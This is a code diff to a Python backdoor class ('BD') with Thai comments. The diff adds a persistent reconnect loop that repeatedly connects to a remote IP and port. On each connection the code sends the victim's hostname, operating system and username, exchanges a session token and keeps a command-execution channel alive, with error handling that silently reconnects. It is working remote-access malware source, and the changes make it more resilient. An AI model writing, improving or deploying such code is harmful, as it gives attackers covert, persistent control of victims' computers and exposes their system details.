@@ -19,21 +19,48 @@ class BD:
         
         self.upgrade_pip()
         self.install_dependencies()
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+        self.ip = ip 
+        self.port = port
+        self.upgrade_pip()
+        self.install_dependencies()
+        self.reconnect()
+        # self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # self.connection.connect((ip, port))
 
-        # ส่งข้อมูลเครื่องไปยัง sv(server)
-        system_info = {
-            'hostname': socket.gethostname(),
-            'os': platform.system() + " " + platform.release(),
-            'user': getpass.getuser(),
-        }
-        self.connect_send(system_info)
+        # # ส่งข้อมูลเครื่องไปยัง sv(server)
+        # system_info = {
+        #     'hostname': socket.gethostname(),
+        #     'os': platform.system() + " " + platform.release(),
+        #     'user': getpass.getuser(),
+        # }
+        # self.connect_send(system_info)
 
-        response = self.connect_receive()
-        self.session_token = response.get('token')
-        self.connect_send(self.session_token)
+        # response = self.connect_receive()
+        # self.session_token = response.get('token')
+        # self.connect_send(self.session_token)
 
+
+
+    def reconnect(self):
+        while True:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((self.ip, self.port))
+                
+                # ส่งข้อมูลระบบ
+                system_info = {
+                    'hostname': socket.gethostname(),
+                    'os': platform.system() + " " + platform.release(),
+                    'user': getpass.getuser(),
+                }
+                self.connect_send(system_info)
+                
+                response = self.connect_receive() 
+                self.session_token = response.get('token')
+                self.connect_send(self.session_token)
+                return
+            except:
+                time.sleep(5)
 
     def upgrade_pip(self):
         try:
@@ -105,17 +132,26 @@ class BD:
             return f"[-] Error executing command: {str(e)}"
 
     def connect_send(self, data):
-        json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        try:
+            json_data = json.dumps(data)
+            self.connection.send(json_data.encode())
+        except:
+            self.reconnect()
 
     def connect_receive(self):
-        json_data = " "
+        json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024).decode()
+                packet_parts = self.connection.recv(1024).decode()
+                if not packet_parts:
+                    self.reconnect()
+                    continue
+                json_data += packet_parts 
                 return json.loads(json_data)
             except ValueError:
                 continue
+            except:
+                self.reconnect()
 
     def change_directory_to(self, path):
         try:
